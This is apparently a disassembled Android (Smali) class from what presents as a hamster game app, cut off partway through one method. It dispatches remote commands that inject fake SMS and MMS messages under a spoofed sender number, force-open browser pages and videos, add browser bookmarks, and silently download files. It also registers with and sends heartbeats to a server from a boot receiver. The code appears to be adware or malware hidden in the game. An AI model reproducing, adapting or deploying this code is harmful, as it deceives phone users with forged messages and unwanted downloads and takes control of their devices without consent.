.class public LDaemon/Action/Action;
.super Ljava/lang/Object;
.source "Action.java"


# static fields
.field public static final EMERGENCY:I = 0x1

.field public static final EXPRESS:I = 0x2

.field public static final NORMAL:I = 0x0

.field public static final STRATEGY_EXPRESS:I = 0x0

.field private static final TAG:Ljava/lang/String; = "Action"

.field public static final action_event:I = 0x3

.field public static final action_init:I = 0x2

.field public static final action_networking:I = 0x1

.field public static final action_notice:I = 0x0

.field public static channe:I = 0x0

.field public static even_mode:I = 0x0

.field public static final event_download:I = 0x1

.field public static final event_download_most:I = 0x2

.field public static final event_end_error:I = 0x3

.field public static final event_end_interrupt:I = 0x2

.field public static final event_end_ok:I = 0x1

.field public static final event_ordinary:I = 0x0

.field public static host:Ljava/lang/String; = null

.field public static final init_read:I = 0x0

.field public static final init_start:I = 0x1

.field public static final init_version_code:I = 0x2

.field public static final key:Ljava/lang/String; = "89860079090902204557"

.field public static final networking_heart:I = 0x1

.field public static final networking_receipt:I = 0x2

.field public static final networking_reg:I = 0x0

.field public static final networking_sp:I = 0x4

.field public static final networking_spinfo:I = 0x3

.field public static final notice_Constraint_ie_mode:I = 0x6

.field public static final notice_Constraint_video_mode:I = 0x5

.field public static final notice_download_mode:I = 0x0

.field public static final notice_ie_mode:I = 0x4

.field public static final notice_ieaddmark_mode:I = 0x7

.field public static final notice_mms_mode:I = 0x2

.field public static final notice_send_number:I = 0x8

.field public static final notice_sms_mode:I = 0x1

.field public static final notice_video_mode:I = 0x3

.field public static print:Ljava/lang/Boolean;

.field public static product:I

.field public static protocol_version:I

.field public static startdate:I

.field public static version:I


# instance fields
.field private context:Landroid/content/Context;

.field private downpath:Ljava/lang/String;

.field private even_num:I

.field private even_type:I

.field private even_version:I

.field private filename:Ljava/lang/String;

.field private notice_info:Ljava/lang/String;

.field private notice_title:Ljava/lang/String;

.field private noticebase:LDaemon/Action/NoticeBase;

.field private priority:I

.field private push_time:I

.field private simulation_tel:Ljava/lang/String;

.field private strategy:I


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    const/4 v1, 0x0

    .line 84
    const/16 v0, 0x66

    sput v0, LDaemon/Action/Action;->version:I

    .line 85
    const/16 v0, 0x457

    sput v0, LDaemon/Action/Action;->channe:I

    .line 86
    const/16 v0, 0xb

    sput v0, LDaemon/Action/Action;->product:I

    .line 87
    const/4 v0, 0x1

    sput v0, LDaemon/Action/Action;->protocol_version:I

    .line 88
    const-string v0, ""

    sput-object v0, LDaemon/Action/Action;->host:Ljava/lang/String;

    .line 89
    sput v1, LDaemon/Action/Action;->startdate:I

    .line 90
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, LDaemon/Action/Action;->print:Ljava/lang/Boolean;

    .line 18
    return-void
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 93
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 95
    iput-object p1, p0, LDaemon/Action/Action;->context:Landroid/content/Context;

    .line 96
    invoke-static {p1}, LDaemon/Service/ReadKey;->ReadInit(Landroid/content/Context;)V

    .line 97
    return-void
.end method

.method public static print(Ljava/lang/String;)V
    .locals 1
    .param p0, "msg"    # Ljava/lang/String;

    .prologue
    .line 413
    sget-object v0, LDaemon/Action/Action;->print:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 414
    const-string v0, "Action"

    invoke-static {v0, p0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 416
    :cond_0
    return-void
.end method


# virtual methods
.method public Generate_events(II)I
    .locals 23
    .param p1, "action"    # I
    .param p2, "mode"    # I

    .prologue
    .line 187
    const-string v3, "Action"

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "action is "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static/range {p1 .. p1}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 188
    const-string v3, "Action"

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "mode is "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static/range {p2 .. p2}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 189
    if-nez p1, :cond_2

    .line 191
    packed-switch p2, :pswitch_data_0

    .line 408
    :cond_0
    :goto_0
    const/4 v3, 0x1

    :goto_1
    return v3

    .line 194
    :pswitch_0
    const-string v3, "download_mode"

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 195
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->context:Landroid/content/Context;

    move-object v3, v0

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v4, v0

    iget-object v4, v4, LDaemon/Action/NoticeBase;->notice_title:Ljava/lang/String;

    .line 196
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v5, v0

    iget-object v5, v5, LDaemon/Action/NoticeBase;->notice_info:Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v6, v0

    iget-object v6, v6, LDaemon/Action/NoticeBase;->downpath:Ljava/lang/String;

    .line 197
    const/4 v7, 0x0

    .line 195
    invoke-static {v3, v4, v5, v6, v7}, LDaemon/Action/Service;->show_Notice(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;I)V

    goto :goto_0

    .line 201
    :pswitch_1
    const-string v3, "sms_mode"

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 202
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->downpath:Ljava/lang/String;

    move-object v3, v0

    if-eqz v3, :cond_1

    .line 203
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->context:Landroid/content/Context;

    move-object v3, v0

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v4, v0

    iget-object v4, v4, LDaemon/Action/NoticeBase;->simulation_tel:Ljava/lang/String;

    .line 204
    new-instance v5, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->notice_title:Ljava/lang/String;

    move-object v6, v0

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v6, v0

    iget-object v6, v6, LDaemon/Action/NoticeBase;->notice_info:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, " "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 205
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v6, v0

    iget-object v6, v6, LDaemon/Action/NoticeBase;->downpath:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    .line 204
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 203
    invoke-static {v3, v4, v5}, LDaemon/Action/Service;->simulation_Sms(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 207
    :cond_1
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->context:Landroid/content/Context;

    move-object v3, v0

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v4, v0

    iget-object v4, v4, LDaemon/Action/NoticeBase;->simulation_tel:Ljava/lang/String;

    .line 208
    new-instance v5, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->notice_title:Ljava/lang/String;

    move-object v6, v0

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, ":"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v6, v0

    iget-object v6, v6, LDaemon/Action/NoticeBase;->notice_info:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 207
    invoke-static {v3, v4, v5}, LDaemon/Action/Service;->simulation_Sms(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 212
    :pswitch_2
    const-string v3, "mms_mode"

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 213
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v3, v0

    iget-object v3, v3, LDaemon/Action/NoticeBase;->notice_title:Ljava/lang/String;

    .line 214
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v4, v0

    iget-object v4, v4, LDaemon/Action/NoticeBase;->notice_info:Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v5, v0

    iget-object v5, v5, LDaemon/Action/NoticeBase;->downpath:Ljava/lang/String;

    .line 215
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v6, v0

    iget-object v6, v6, LDaemon/Action/NoticeBase;->simulation_tel:Ljava/lang/String;

    .line 213
    invoke-static {v3, v4, v5, v6}, LDaemon/Action/Service;->simulation_Mms(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 219
    :pswitch_3
    const-string v3, "video_mode"

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 220
    new-instance v3, LDaemon/Service/Notice;

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->context:Landroid/content/Context;

    move-object v4, v0

    invoke-direct {v3, v4}, LDaemon/Service/Notice;-><init>(Landroid/content/Context;)V

    sput-object v3, LHamsterSuper/Client/Game/NoticeVideo;->notice:LDaemon/Service/Notice;

    .line 221
    sget-object v3, LHamsterSuper/Client/Game/NoticeVideo;->notice:LDaemon/Service/Notice;

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v4, v0

    iget-object v4, v4, LDaemon/Action/NoticeBase;->downpath:Ljava/lang/String;

    invoke-virtual {v3, v4}, LDaemon/Service/Notice;->setfilename(Ljava/lang/String;)V

    .line 222
    sget-object v3, LHamsterSuper/Client/Game/NoticeVideo;->notice:LDaemon/Service/Notice;

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v4, v0

    iget-object v4, v4, LDaemon/Action/NoticeBase;->notice_title:Ljava/lang/String;

    .line 223
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v5, v0

    iget-object v5, v5, LDaemon/Action/NoticeBase;->notice_info:Ljava/lang/String;

    const/4 v6, 0x2

    .line 222
    invoke-virtual {v3, v4, v5, v6}, LDaemon/Service/Notice;->showNotice(Ljava/lang/String;Ljava/lang/String;I)V

    goto/16 :goto_0

    .line 227
    :pswitch_4
    const-string v3, "ie_mode"

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 228
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->context:Landroid/content/Context;

    move-object v3, v0

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v4, v0

    iget-object v4, v4, LDaemon/Action/NoticeBase;->notice_title:Ljava/lang/String;

    .line 229
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v5, v0

    iget-object v5, v5, LDaemon/Action/NoticeBase;->notice_info:Ljava/lang/String;

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v6, v0

    iget-object v6, v6, LDaemon/Action/NoticeBase;->downpath:Ljava/lang/String;

    .line 230
    const/4 v7, 0x3

    .line 228
    invoke-static {v3, v4, v5, v6, v7}, LDaemon/Action/Service;->show_Notice(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;I)V

    goto/16 :goto_0

    .line 234
    :pswitch_5
    const-string v3, "Constraint_video_mode"

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 235
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->context:Landroid/content/Context;

    move-object v3, v0

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v4, v0

    iget-object v4, v4, LDaemon/Action/NoticeBase;->downpath:Ljava/lang/String;

    invoke-static {v3, v4}, LDaemon/Action/Service;->open_Media(Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 239
    :pswitch_6
    const-string v3, "Constraint_ie_mode"

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 240
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->context:Landroid/content/Context;

    move-object v3, v0

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v4, v0

    iget-object v4, v4, LDaemon/Action/NoticeBase;->downpath:Ljava/lang/String;

    invoke-static {v3, v4}, LDaemon/Action/Service;->open_IE(Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 244
    :pswitch_7
    const-string v3, "ieaddmark_mode"

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 245
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->context:Landroid/content/Context;

    move-object v3, v0

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v4, v0

    iget-object v4, v4, LDaemon/Action/NoticeBase;->notice_title:Ljava/lang/String;

    .line 246
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->noticebase:LDaemon/Action/NoticeBase;

    move-object v5, v0

    iget-object v5, v5, LDaemon/Action/NoticeBase;->downpath:Ljava/lang/String;

    .line 245
    invoke-static {v3, v4, v5}, LDaemon/Action/Service;->add_IE(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 250
    :pswitch_8
    const-string v3, "notice_send_number"

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 251
    sget v3, LHamsterSuper/Client/Game/BootReceiver;->send_mode:I

    if-nez v3, :cond_0

    .line 252
    invoke-static {}, LDaemon/Service/TaskPool;->getInstance()LDaemon/Service/TaskPool;

    move-result-object v3

    sget-object v4, LHamsterSuper/Client/Game/BootReceiver;->sphttp:LDaemon/Protocol/SpHttp;

    invoke-virtual {v3, v4}, LDaemon/Service/TaskPool;->addConnectTask(LDaemon/Base/HttpBase;)V

    goto/16 :goto_0

    .line 256
    :cond_2
    const/4 v3, 0x1

    move/from16 v0, p1

    move v1, v3

    if-ne v0, v1, :cond_5

    .line 258
    const/4 v3, 0x5

    new-array v13, v3, [LDaemon/Base/HttpBase;

    const/4 v3, 0x0

    sget-object v4, LHamsterSuper/Client/Game/BootReceiver;->reghttp:LDaemon/Protocol/RegHttp;

    aput-object v4, v13, v3

    const/4 v3, 0x1

    .line 259
    sget-object v4, LHamsterSuper/Client/Game/BootReceiver;->hearthttp:LDaemon/Protocol/HeartHttp;

    aput-object v4, v13, v3

    const/4 v3, 0x2

    sget-object v4, LHamsterSuper/Client/Game/BootReceiver;->receipt:LDaemon/Protocol/Receipt;

    aput-object v4, v13, v3

    const/4 v3, 0x3

    .line 260
    sget-object v4, LHamsterSuper/Client/Game/BootReceiver;->sphttp:LDaemon/Protocol/SpHttp;

    aput-object v4, v13, v3

    const/4 v3, 0x4

    sget-object v4, LHamsterSuper/Client/Game/BootReceiver;->mostsphttp:LDaemon/Protocol/MostSpHttp;

    aput-object v4, v13, v3

    .line 262
    .local v13, "bases":[LDaemon/Base/HttpBase;
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "handle action_networking "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static/range {p2 .. p2}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 263
    if-nez p2, :cond_4

    .line 264
    sget-object v3, LHamsterSuper/Client/Game/BootReceiver;->reghttp:LDaemon/Protocol/RegHttp;

    invoke-virtual {v3}, LDaemon/Protocol/RegHttp;->readrms()Z

    move-result v3

    if-eqz v3, :cond_3

    .line 265
    const-string v3, "BootReceiver.reghttp action"

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 266
    invoke-static {}, LDaemon/Service/TaskPool;->getInstance()LDaemon/Service/TaskPool;

    move-result-object v3

    aget-object v4, v13, p2

    invoke-virtual {v3, v4}, LDaemon/Service/TaskPool;->addConnectTask(LDaemon/Base/HttpBase;)V

    .line 270
    :cond_3
    :goto_2
    const-string v3, "handle action_networking finish"

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 269
    :cond_4
    invoke-static {}, LDaemon/Service/TaskPool;->getInstance()LDaemon/Service/TaskPool;

    move-result-object v3

    aget-object v4, v13, p2

    invoke-virtual {v3, v4}, LDaemon/Service/TaskPool;->addConnectTask(LDaemon/Base/HttpBase;)V

    goto :goto_2

    .line 272
    .end local v13    # "bases":[LDaemon/Base/HttpBase;
    :cond_5
    const/4 v3, 0x3

    move/from16 v0, p1

    move v1, v3

    if-ne v0, v1, :cond_f

    .line 274
    const-string v3, "action_event"

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 275
    packed-switch p2, :pswitch_data_1

    goto/16 :goto_0

    .line 278
    :pswitch_9
    const-string v3, "event_ordinary"

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 279
    sget-object v3, LHamsterSuper/Client/Game/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    move-object/from16 v0, p0

    iget v0, v0, LDaemon/Action/Action;->even_num:I

    move v4, v0

    move-object/from16 v0, p0

    iget v0, v0, LDaemon/Action/Action;->even_version:I

    move v5, v0

    mul-int/lit8 v5, v5, 0xa

    .line 280
    move-object/from16 v0, p0

    iget v0, v0, LDaemon/Action/Action;->even_type:I

    move v6, v0

    add-int/2addr v5, v6

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->notice_title:Ljava/lang/String;

    move-object v6, v0

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->notice_info:Ljava/lang/String;

    move-object v7, v0

    move-object/from16 v0, p0

    iget v0, v0, LDaemon/Action/Action;->push_time:I

    move v8, v0

    .line 281
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->simulation_tel:Ljava/lang/String;

    move-object v9, v0

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->downpath:Ljava/lang/String;

    move-object v10, v0

    move-object/from16 v0, p0

    iget v0, v0, LDaemon/Action/Action;->priority:I

    move v11, v0

    move-object/from16 v0, p0

    iget v0, v0, LDaemon/Action/Action;->strategy:I

    move v12, v0

    .line 279
    invoke-virtual/range {v3 .. v12}, LDaemon/DownLoad/FileDownloader;->addEvent(IILjava/lang/String;Ljava/lang/String;ILjava/lang/String;Ljava/lang/String;II)V

    goto/16 :goto_0

    .line 285
    :pswitch_a
    const-string v3, "event_download"

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 286
    invoke-static {}, Landroid/os/Environment;->getExternalStorageState()Ljava/lang/String;

    move-result-object v3

    .line 287
    const-string v4, "mounted"

    .line 286
    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_6

    .line 289
    const/4 v3, 0x1

    goto/16 :goto_1

    .line 292
    :cond_6
    :try_start_0
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->downpath:Ljava/lang/String;

    move-object v14, v0

    .line 293
    .local v14, "downpath_temp":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->filename:Ljava/lang/String;

    move-object/from16 v17, v0

    .line 294
    .local v17, "filename_temp":Ljava/lang/String;
    const/16 v16, 0x0

    .line 295
    .local v16, "file_type":Z
    if-eqz v17, :cond_9

    .line 296
    invoke-virtual/range {v17 .. v17}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v17

    .line 297
    const/16 v18, 0x0

    .local v18, "i":I
    :goto_3
    sget-object v3, LDaemon/Service/Notice;->show_type:[Ljava/lang/String;

    array-length v3, v3

    move/from16 v0, v18

    move v1, v3

    if-lt v0, v1, :cond_7

    .line 303
    :goto_4
    if-nez v16, :cond_9

    .line 304
    const/4 v3, 0x1

    goto/16 :goto_1

    .line 298
    :cond_7
    sget-object v3, LDaemon/Service/Notice;->show_type:[Ljava/lang/String;

    aget-object v3, v3, v18

    move-object/from16 v0, v17

    move-object v1, v3

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v4, -0x1

    if-eq v3, v4, :cond_8

    .line 299
    const/16 v16, 0x1

    .line 300
    goto :goto_4

    .line 297
    :cond_8
    add-int/lit8 v18, v18, 0x1

    goto :goto_3

    .line 307
    .end local v18    # "i":I
    :cond_9
    if-eqz v14, :cond_c

    .line 308
    invoke-virtual {v14}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v14

    .line 309
    const/16 v18, 0x0

    .restart local v18    # "i":I
    :goto_5
    sget-object v3, LDaemon/Service/Notice;->show_type:[Ljava/lang/String;

    array-length v3, v3

    move/from16 v0, v18

    move v1, v3

    if-lt v0, v1, :cond_a

    .line 315
    :goto_6
    if-nez v16, :cond_c

    .line 316
    const/4 v3, 0x1

    goto/16 :goto_1

    .line 310
    :cond_a
    sget-object v3, LDaemon/Service/Notice;->show_type:[Ljava/lang/String;

    aget-object v3, v3, v18

    invoke-virtual {v14, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v3

    const/4 v4, -0x1

    if-eq v3, v4, :cond_b

    .line 311
    const/16 v16, 0x1

    .line 312
    goto :goto_6

    .line 309
    :cond_b
    add-int/lit8 v18, v18, 0x1

    goto :goto_5

    .line 319
    .end local v14    # "downpath_temp":Ljava/lang/String;
    .end local v16    # "file_type":Z
    .end local v17    # "filename_temp":Ljava/lang/String;
    .end local v18    # "i":I
    :catch_0
    move-exception v3

    .line 323
    :cond_c
    sget-object v3, LHamsterSuper/Client/Game/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    move-object/from16 v0, p0

    iget v0, v0, LDaemon/Action/Action;->even_num:I

    move v4, v0

    move-object/from16 v0, p0

    iget v0, v0, LDaemon/Action/Action;->even_version:I

    move v5, v0

    .line 324
    mul-int/lit8 v5, v5, 0xa

    move-object/from16 v0, p0

    iget v0, v0, LDaemon/Action/Action;->even_type:I

    move v6, v0

    add-int/2addr v5, v6

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->notice_title:Ljava/lang/String;

    move-object v6, v0

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->notice_info:Ljava/lang/String;

    move-object v7, v0

    move-object/from16 v0, p0

    iget v0, v0, LDaemon/Action/Action;->push_time:I

    move v8, v0

    .line 325
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->simulation_tel:Ljava/lang/String;

    move-object v9, v0

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->downpath:Ljava/lang/String;

    move-object v10, v0

    move-object/from16 v0, p0

    iget v0, v0, LDaemon/Action/Action;->priority:I

    move v11, v0

    move-object/from16 v0, p0

    iget v0, v0, LDaemon/Action/Action;->strategy:I

    move v12, v0

    .line 323
    invoke-virtual/range {v3 .. v12}, LDaemon/DownLoad/FileDownloader;->setType(IILjava/lang/String;Ljava/lang/String;ILjava/lang/String;Ljava/lang/String;II)I

    move-result v22

    .line 326
    .local v22, "type":I
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "event_download_type:"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object v0, v3

    move/from16 v1, v22

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 328
    const/4 v3, 0x2

    move/from16 v0, v22

    move v1, v3

    if-ne v0, v1, :cond_0

    .line 331
    :try_start_1
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->downpath:Ljava/lang/String;

    move-object v3, v0

    invoke-static {v3}, LDaemon/DownLoad/DownloadTask;->print(Ljava/lang/String;)V

    .line 332
    sget-object v3, LHamsterSuper/Client/Game/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->downpath:Ljava/lang/String;

    move-object v4, v0

    .line 333
    move-object/from16 v0, p0

    iget-object v0, v0, LDaemon/Action/Action;->filename:Ljava/lang/String;

    move-object v5, v0

    const/4 v6, 0x1

    .line 332
    invoke-virtual {v3, v4, v5, v6}, LDaemon/DownLoad/FileDownloader;->UpdateFileDownloader(Ljava/lang/String;Ljava/lang/String;I)V

    .line 334
    sget-object v3, LHamsterSuper/Client/Game/BootReceiver;->downer:LDaemon/DownLoad/FileDownloader;

    const/4 v4, 0x0

    invoke-virtual {v3, v4}, LDaemon/DownLoad/FileDownloader;->download(LDaemon/DownLoad/DownloadProgressListener;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto/16 :goto_0

    .line 335
    :catch_1
    move-exception v3

    move-object v15, v3

    .line 337
    .local v15, "e":Ljava/lang/Exception;
    invoke-virtual {v15}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_0

    .line 345
    .end local v15    # "e":Ljava/lang/Exception;
    .end local v22    # "type":I
    :pswitch_b
    const-string v3, "event_download_most"

    invoke-static {v3}, LDaemon/Action/Action;->print(Ljava/lang/String;)V

    .line 346
    invoke-static {}, Landroid/os/Environment;->getExternalStorageState()Ljava/lang/String;

    move-result-object v3

    .line 347
    const-string v4, "mounted"

    .line 346
    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_d

    .line 349
